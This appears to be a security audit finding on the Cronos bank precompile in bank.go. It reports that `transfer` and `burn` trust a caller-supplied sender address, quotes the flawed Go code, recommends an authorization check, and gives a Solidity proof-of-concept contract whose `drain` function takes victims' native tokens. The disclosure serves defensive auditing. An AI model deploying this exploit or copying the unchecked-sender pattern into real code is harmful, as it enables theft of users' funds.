### Title
Bank Precompile `transfer` Accepts Arbitrary `sender` Without Authorization — Unauthorized Native Token Drain - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `BankContract` precompile at `0x0000000000000000000000000000000000000064` exposes a `transfer(address sender, address recipient, uint256 amount)` method that accepts the `sender` address as a fully caller-controlled argument. No check is made that the calling contract is authorized to move funds on behalf of `sender`. Any EVM contract can therefore call `bankPrecompile.transfer(victimAddress, attackerAddress, amount)` and drain the victim's native tokens of the denom `evm/<callerContract>` without the victim's consent. The `burn(address, uint256)` method has the identical flaw.

### Finding Description
In `x/cronos/keeper/precompiles/bank.go` the `TransferMethodName` branch unpacks three arguments and immediately uses the first as the fund source:

```go
// lines 175-192
sender    := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
...
from  := sdk.AccAddress(sender.Bytes())
to    := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())    // "evm/<callerContract>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`contract.Caller()` is the calling EVM contract, so the denom is scoped to that contract. There is no check that `contract.Caller() == sender`, no allowance mechanism, and no other authorization guard. The `BurnMethodName` branch has the same structure: `args[0]` is the address whose tokens are burned, again without any caller-authorization check (line 144: `bankKeeper.SendCoinsFromAccountToModule(ctx, addr, ...)`).

The integration test contract `TestBank.sol` (line 35-38) demonstrates the intended usage pattern — a CRC20 contract calls `bank.transfer(msg.sender, recipient, amount)` — but the precompile itself enforces nothing about who `msg.sender` is relative to the `sender` argument.

### Impact Explanation
**Critical — Unauthorized transfer/burn of precompile-controlled native assets.**

Any unprivileged EVM contract can:
1. Call `bankPrecompile.transfer(victim, attacker, N)` to move `N` units of `evm/<attackerContract>` from `victim` to `attacker`.
2. Call `bankPrecompile.burn(victim, N)` to destroy `N` units of `evm/<attackerContract>` held by `victim`.

Users accumulate `evm/<contractAddress>` native tokens whenever they call `moveToNative()` (i.e., `bank.mint(msg.sender, amount)`) on a CRC20 contract, or receive them via IBC conversion middleware. Once a victim holds such tokens, the contract that issued them can drain or destroy them at will without any further user interaction.

### Likelihood Explanation
The attacker path requires only:
1. Deploying a contract (zero privilege required).
2. Inducing users to hold `evm/<attackerContract>` native tokens — achievable by advertising a legitimate-looking CRC20 contract with `moveToNative` functionality, or by being an existing registered CRC20 contract whose users have converted tokens.

The precompile is reachable by any EVM call; no admin key, governance vote, or validator compromise is needed.

### Recommendation
In the `TransferMethodName` branch, enforce that the caller is authorized to move funds on behalf of `sender`. The simplest fix mirrors the ERC-20 `transferFrom` model: require `contract.Caller() == sender`, or maintain an on-chain allowance mapping inside the precompile. The same fix must be applied to the `BurnMethodName` branch, where `args[0]` is the address whose tokens are destroyed.

### Proof of Concept
```solidity

pragma solidity ^0.8.0;

interface IBankModule {
    function transfer(address sender, address recipient, uint256 amount)
        external payable returns (bool);
    function mint(address recipient, uint256 amount)
        external payable returns (bool);
    function balanceOf(address token, address account)
        external view returns (uint256);
}

contract AttackerCRC20 {
    IBankModule constant bank =
        IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: victim calls this to acquire evm/<this> native tokens
    function depositNative(uint256 amount) external {
        // burns ERC-20 balance (omitted) and mints native tokens to msg.sender
        bank.mint(msg.sender, amount);
    }

    // Step 2: attacker calls this at any later time — no victim interaction needed
    function drain(address victim, address attacker, uint256 amount) external {
        // denom = "evm/<address(this)>", sender = victim — NO auth check in precompile
        bank.transfer(victim, attacker, amount);
    }
}
```

**Execution:**
1. Deploy `AttackerCRC20` at `0xATK`.
2. Victim calls `depositNative(100)` → victim now holds 100 `evm/0xATK` native tokens.
3. Attacker calls `drain(victim, attacker, 100)` → `bankKeeper.SendCoins(victim, attacker, 100 evm/0xATK)` executes with no revert.
4. Victim's native balance is zero; attacker holds 100 `evm/0xATK`.
